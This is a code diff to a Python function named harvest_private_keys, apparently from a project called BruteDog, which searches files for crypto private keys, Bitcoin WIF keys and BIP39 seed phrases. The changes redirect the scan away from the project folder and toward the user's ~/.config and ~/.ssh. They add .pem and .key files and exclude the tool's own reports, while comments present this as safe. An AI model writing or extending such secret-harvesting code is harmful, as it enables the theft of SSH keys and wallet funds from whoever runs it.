@@ -4,7 +4,7 @@ import re
 def is_valid_bip39_seed(text):
     """
     Strict validation for BIP39 seed phrases: Must be exactly 12 or 24 words,
-    contain only alphabetic characters, and consist solely of valid English mnemonic words.
+    contain only alphabetic characters, and consist solely of valid mnemonic words.
     """
     words = text.strip().lower().split()
     if len(words) not in [12, 24]:
@@ -41,11 +41,15 @@ def harvest_private_keys(root_dir="."):
     hex_key_pattern = re.compile(r'\b(?:0x)?[a-fA-F0-9]{64}\b')
     btc_wif_pattern = re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b')
     
+    # Exclude the local project directory if it contains mock reports, scan only real system paths & user configs
     search_paths = [
-        os.path.abspath(root_dir),
         os.path.expanduser("~/.config"),
         os.path.expanduser("~/.ssh")
     ]
+    
+    # If a specific external target directory was explicitly requested, include it safely
+    if root_dir != "." and os.path.exists(root_dir):
+        search_paths.append(os.path.abspath(root_dir))
     
     scanned_files = 0
     for path in search_paths:
@@ -53,12 +57,12 @@ def harvest_private_keys(root_dir="."):
             continue
             
         for current_root, dirs, files in os.walk(path):
-            skip_tokens = ["/tmp", "site-packages", "pip-install", "venv", ".git", "node_modules", "__pycache__"]
+            skip_tokens = ["/tmp", "site-packages", "pip-install", "venv", ".git", "node_modules", "__pycache__", "reports", "BruteDog"]
             if any(token in current_root for token in skip_tokens):
                 continue
                 
             for file in files:
-                if file.endswith(('.txt', '.env', '.json', '.log', '.conf', '.ini')):
+                if file.endswith(('.txt', '.env', '.json', '.log', '.conf', '.ini', '.pem', '.key')):
                     file_path = os.path.join(current_root, file)
                     scanned_files += 1
                     try:
